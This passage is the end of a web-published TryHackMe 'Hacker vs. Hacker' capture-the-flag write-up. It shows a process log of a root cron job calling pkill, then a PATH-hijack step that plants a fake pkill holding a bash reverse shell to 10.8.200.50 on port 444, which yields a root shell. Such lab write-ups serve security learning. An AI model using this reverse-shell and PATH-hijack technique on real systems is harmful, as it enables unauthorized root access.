</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1514</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1500</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>15</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1490</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1478</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1468</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>14</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>13</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>120</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>12</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>33</span>   PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1171</span>   | /usr/sbin/apache2 -k start 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>11</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>107</span>    |
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>104</span>    | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>     | 
</span></span><span style=display:flex><span>2022/08/22 19:22:17 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>      | /sbin/init maybe-ubiquity 
</span></span><span style=display:flex><span>2022/08/22 19:22:22 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2632</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:22:32 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2635</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:22:37 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2636</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:22:42 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2639</span>   | pkill -9 -t pts/ptmx 
</span></span><span style=display:flex><span>2022/08/22 19:22:52 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2642</span>   | 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2648</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2647</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2646</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2645</span>   | /usr/sbin/cron -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2644</span>   | /usr/sbin/cron -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2643</span>   | /usr/sbin/cron -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2650</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2649</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2651</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2652</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>11</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2654</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2653</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2655</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>1</span>  <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2656</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>21</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2657</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>41</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2659</span>   | /usr/sbin/CRON -f 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2658</span>   | /bin/sh -c /bin/sleep <span style=color:#ae81ff>31</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>`</span>/bin/ls /dev/pts<span style=color:#e6db74>`</span>; <span style=color:#66d9ef>do</span> /usr/bin/echo nope 
</span></span><span style=display:flex><span>&gt; /dev/pts/$f <span style=color:#f92672>&amp;&amp;</span> pkill -9 -t pts/$f; <span style=color:#66d9ef>done</span> 
</span></span><span style=display:flex><span>2022/08/22 19:23:01 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2660</span>   | /bin/sleep <span style=color:#ae81ff>51</span> 
</span></span><span style=display:flex><span>2022/08/22 19:23:02 CMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>    PID<span style=color:#f92672>=</span><span style=color:#ae81ff>2663</span>   | pkill -9 -t pts/ptmx
</span></span></code></pre></div><p>Then we can modify <code>PATH</code> variable, in order to prepend /home/lachlan/bin, so we can create a malicious file named <code>pkill</code>, which will be executed from our location first.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>lachlan@b2r:/home/lachlan/bin$ export PATH<span style=color:#f92672>=</span>/home/lachlan/bin:$PATH
</span></span><span style=display:flex><span>lachlan@b2r:/home/lachlan/bin$ echo $PATH
</span></span><span style=display:flex><span>/home/lachlan/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</span></span><span style=display:flex><span>lachlan@b2r:/home/lachlan/bin$ echo <span style=color:#e6db74>&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.8.200.50/444 &lt;&amp;1&#39;&#34;</span> &gt; pkill
</span></span></code></pre></div><p>Then open another netcat listener and after a while the process <code>pkill</code> is executed with our file we get a root reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>root@b2r:~# cat root.txt
</span></span><span style=display:flex><span>thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>Proof of Concept (PoC image):
<img src=../../../thm/hackervshacker/hackervshacker.png alt="Hacker vs. Hacker photo" style=width:700px;height:300px></p></div><footer class=post-footer><nav class=paginav><a class=prev href=https://geobour98.com/write-ups/thm/annie/><span class=title>« Prev Page</span><br><span>TryHackMe - Annie</span></a>
<a class=next href=https://geobour98.com/write-ups/thm/jason/><span class=title>Next Page »</span><br><span>TryHackMe - Jason</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>